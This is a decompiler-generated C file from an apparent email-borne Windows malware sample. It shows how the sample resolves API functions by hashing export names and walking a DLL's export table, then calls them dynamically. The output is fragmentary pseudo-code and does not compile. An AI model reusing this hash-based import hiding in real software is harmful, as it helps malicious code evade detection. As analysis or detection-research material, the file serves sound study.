// subject.c
// Generated on 5/4/2015 12:43:58 AM by decompiling malware_via_email/malware_0118/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

word32 fn00401000(word32 dwArg04, word32 dwArg08)
{
	if (globals->dw405000 == 0x00000000)
	{
		globals->dw405000 = LoadLibraryA(0x0040100E);
		dwLoc08 = 0x0040100E;
	}
	if (globals->dw405004 == 0x00000000)
	{
		fp->dwFFFFFFF8 = 0x960811C1;
		globals->dw405004 = fn00401091(globals->dw405000, dwLoc08);
	}
	word32 eax_26 = fn00401091(LoadLibraryA(dwArg04), dwArg08);
	if (eax_26 == 0x00000000)
		int3();
	return eax_26;
}

word32 fn0040105B(word32 dwArg04)
{
	Eq_47 * edi_31 = dwArg04;
	word32 ebx_32 = 0x00000000;
	byte bl_33 = 0x00;
	bcu8 cl_35 = 0x00;
	do
	{
		cl_35 = cl_35 ^ edi_31->b0000;
		word32 ebx_50 = DPB(ebx_32, bl_33 ^ edi_31->b0000, 0, 8);
		while (cl_35 >=u 0x20)
			cl_35 = cl_35 - 0x20;
		ebx_32 = __rol(ebx_50, cl_35);
		edi_31 = edi_31 + 1;
		bl_33 = (byte) ebx_32;
	} while (edi_31->b0000 != 0x00);
	return ebx_32;
}

word32 fn00401091(word32 dwArg04, word32 dwArg08)
{
	if (dwArg04 == null)
		return eax;
	else
	{
		Eq_83 * dwLoc1C_49 = dwArg04->ptr003C;
		if (Mem0[dwLoc1C_49 + dwArg04:word16] == 0x4550)
		{
			word32 ecx_71 = Mem0[dwLoc1C_49 + 0x00000078 + dwArg04:word32];
			if (ecx_71 != 0x00000000)
			{
				Eq_99 * ecx_76 = ecx_71 + dwArg04;
				word32 dwLoc1C_78 = ecx_76->dw0018;
				word32 * eax_87[] = ecx_76->dw001C + dwArg04;
				Eq_259 * edi_92[] = ecx_76->dw0024 + dwArg04;
				Eq_115 * esi_104 = ecx_76->dw0020 + dwArg04;
				word32 dwLoc08_102 = dwLoc1C_78;
				do
				{
					if (fn0040105B(esi_104->dw0000 + dwArg04) == dwArg08)
					{
						fp->dwFFFFFFE8 = eax_87[edi_92[dwLoc1C_78 - dwLoc08_102].dw0000 & 0x0000FFFF] + dwArg04;
						goto l0040111E;
					}
					word32 v14_120 = dwLoc08_102 - 0x00000001;
					esi_104 = esi_104 + 1;
					dwLoc08_102 = v14_120;
				} while (v14_120 != 0x00000000);
			}
		}
l0040111E:
		return 0x00000000;
	}
}

void fn0040161D()
{
	return;
}

void fn00402764()
{
	code * eax_19 = fn00401000(0x0040112B, globals->dw402766);
	if (eax_19 != null)
		eax_19();
	fp->dwFFFFFFE0 = 0x004027AA;
	return;
}

void fn0040298D()
{
	code * eax_13 = fn00401000(0x0040168A, globals->dw401DDD);
	code * eax_15 = eax_13;
	if (eax_13 != null)
		eax_13();
	if (eax_15 != null)
	{
		globals->ptr405AA8 = eax_15;
		fp->dwFFFFFFEC = 0x004029CB;
		return;
	}
	else
		return;
}

void fn0040306F()
{
	fn0040298D();
	fp->dwFFFFFFFC = 0x00000000;
	fn0040161D();
	fp->dwFFFFFFFC = 0x00000001;
	fn00402764();
	fp->dwFFFFFFFC = 0x00000400;
	fp->dwFFFFFFFC = 0x00406EE0;
	fp->dwFFFFFFFC = 0x00000000;
	fp->dwFFFFFFFC = globals->dw401B20;
	fp->dwFFFFFFFC = 0x0040112B;
	code * eax_22 = fn00401000(dwArg00, dwArg04);
	word32 esp_23 = fp - 0x0000000C;
	if (eax_22 != null)
		eax_22();
	globals->dw406BA0 = 0x00000044;
	globals->dw406BCC = 0x00000001;
	globals->w406BD0 = 0x0002;
	Eq_244 * esp_36 = esp_23 - 0x00000004;
	esp_36->dw0000 = 0x00402AB8;
	esp_36->dw0000 = 0x004030D5;
	esp_36->dw0000 = 0x00401266;
	return;
}

